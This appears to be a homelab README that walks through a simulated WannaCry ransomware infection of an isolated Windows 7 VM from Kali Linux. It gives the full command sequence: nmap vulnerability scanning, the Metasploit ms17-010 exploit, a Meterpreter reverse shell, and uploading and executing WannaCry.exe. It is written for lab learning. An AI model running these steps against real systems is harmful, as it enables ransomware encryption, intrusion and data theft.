# 🥷 WannaCry Attack Simulation 

A walkthrough on WannaCry/WannaCrypt ransomware attack simulation on Virtual Box using 2 virtual machines. 
The virtual machine hosts are as follows: 
 - Attacker Machine - Kali Linux 
 - Victim Machine - Windows 7

## 🪛 Tools & Technologies
 - <code> Linux </code>
 - <code> NMAP </code>
 - <code> Metasploit </code>
 - <code> Snapshots </code>

 ## ⚙️ Initial Setup
 1. Install a Hypervisor(Hosted Hypervisor for homelab) like VirtualBox, VMWare, etc.
 2. Install the latest Kali Linux disk image and upload it onto the VirtualBox hypervisor. This will be our host machine for attacking.
 3. Install a Windows 7 machine disk image similarly onto the VirtualBox. This will be the victim machine that will be exploited using Kali Linux host machine.
 4. Create a new NAT Network on the VirtualBox, say TestNet. Modify the network preferences of the two hosts so that they are on this same network "TestNet".
 5. Most importantly, take a snapshot of both the machines, inorder to restore them back to their previous form after the machine gets encrypted. <br />
 
<i> (Both the machines are now ready to start the simulation.) </i>

## 💻 The Process - Threat Vector
1. You are the attacker. Using Kali Linux terminal, ensure you have the highest privileges to run the commands without objection: <code> sudo su </code>
2. Find out the IP of your current Kali Linux machine: <code> ifconfig </code>
3. Scan the network using the tool "nmap" for devices/hosts on the same network: <code> nmap -Pn (IP-Range)/CIDR </code>
4. Scan the host found with a lot of open ports for any vulnerabilities: <code> nmap --script vuln -sV (IP) </code>
5. Using Metasploit, search and load the payload/exploit for the discovered vulnerability "smb-vuln-ms17-010" remote code execution:
   - <code> msfconsole </code>
   - <code> search ms17-010 </code>
   - <code> use (payload number) </code>
   - <code> show options </code>
   - <code> set RHOSTS (Windows7 IP) </code>
   - <code> run </code>
6. Using the Meterpreter reverse shell perform the desired actions - data exfiltration/.WNRY encryption.
7. Download the Malware WannaCry executable from GitHub onto /home/kali and upload it to the victim's machine:
   - <code> upload /home/kali/WannaCry.exe </code>
   - <code> execute -f WannaCry.exe </code>
8. The Windows 7 host is now completely encrypted with .wnry extension. To restore to original form, restore the saved snapshot of the Windows7 machine.<br />
<b>(DO NOT click on any of the links inside the encrypted Windows7 machine. DO NOT Pay the ransom. Just restore the original state using the snapshot after shutting it down.)</b>

## 📸 Preview
![simulation proof](<Malware Attack Proof (2).png>)
